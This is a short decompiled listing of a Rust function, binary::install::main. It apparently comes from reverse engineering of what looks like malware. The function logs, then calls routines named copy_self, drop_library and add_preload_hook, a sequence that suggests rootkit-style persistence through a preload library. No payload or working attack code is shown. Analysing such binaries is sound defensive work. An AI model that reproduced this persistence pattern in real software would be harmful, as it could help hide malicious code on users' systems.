
  uint64_t binary::install::main::h1e5509fe79972199()

{
    char const* const var_78;
    char const (** const var_50)[0x0];
    
    if (core::sync::atomic::atomic_load::hd7b4c98b0ffd57c6() >= 3)
    {
        var_50 = &data_1ce6ab8;
        int64_t var_48_1 = 1;
        int64_t var_40_1 = 8;
        int128_t var_38_1 = {0};
        int64_t rax_1 = log::__private_api::loc::h72c33e8a02a7057c(&data_1ce6ad8);
        var_78 = &data_45022a[0x15];
        int64_t var_70_1 = 0xf;
        char const* const var_68_1 = &data_45022a[0x15];
        int64_t var_60_1 = 0xf;
        int64_t var_58_1 = rax_1;
        log::__private_api::log::h450dfdf51a11f9e0(&var_50, 3, &var_78);
    }
    
    binary::install::copy_self::h6799c86bda448ec8();
    void var_20;
    binary::install::drop_library::h6c2d6da60051269a(&var_20);
    binary::install::add_preload_hook::hf67ddbcc23099137(&var_20);
    uint64_t result = core::sync::atomic::atomic_load::hd7b4c98b0ffd57c6();
    
    if (result < 3)
        return result;
    
    var_50 = &data_1ce6ac8;
    int64_t var_48_2 = 1;
    int64_t var_40_2 = 8;
    int128_t var_38_2 = {0};
    int64_t rax_2 = log::__private_api::loc::h72c33e8a02a7057c(&data_1ce6af0);
    var_78 = &data_45022a[0x15];
    int64_t var_70_2 = 0xf;
    char const* const var_68_2 = &data_45022a[0x15];
    int64_t var_60_2 = 0xf;
    int64_t var_58_2 = rax_2;
    return log::__private_api::log::h450dfdf51a11f9e0(&var_50, 3, &var_78);
}
